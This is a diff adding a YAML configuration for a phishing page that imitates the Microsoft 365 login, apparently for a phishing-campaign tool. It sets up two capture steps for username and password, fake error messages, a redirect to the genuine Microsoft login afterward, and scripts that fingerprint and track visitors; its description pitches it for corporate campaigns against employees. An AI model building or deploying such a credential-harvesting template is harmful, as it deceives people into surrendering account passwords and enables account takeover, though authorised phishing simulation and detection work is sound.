@@ -1,0 +1,43 @@
+info:
+  name: microsoft365 Login
+  author: mh4x0f
+  description: A phishing template mimicking the Microsoft 365 login page, designed to capture user credentials. This template is ideal for corporate phishing campaigns targeting employees who use Microsoft 365 services.
+  category: corporate
+  system: true
+  tags:
+    - login
+    - microsoft365
+template_dir: microsoft_login
+steps:
+  - id: login
+    title: Login Office365
+    path: /login
+    method: POST
+    template_file: login.html
+    success_message: Login information received. Proceeding to verification...
+    next: password
+    capture:
+      enabled: true
+      fields:
+        - name: username
+          required: true
+          validate_regex: ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$
+          error_message: We couldn't find an account with that username. Try another
+    simulate_delay_ms: 300
+  - id: password
+    title: Password login
+    path: /password
+    method: POST
+    template_file: password.html
+    redirect_url: https://login.microsoftonline.com
+    capture:
+      enabled: true
+      fields:
+        - name: password
+          required: true
+          validate_regex: ^.{6,}$
+          error_message: The password is incorrect. Please try again..
+hooks:
+  onLoad:
+    - /hooks/fingerprint.js
+    - /hooks/behavior.js
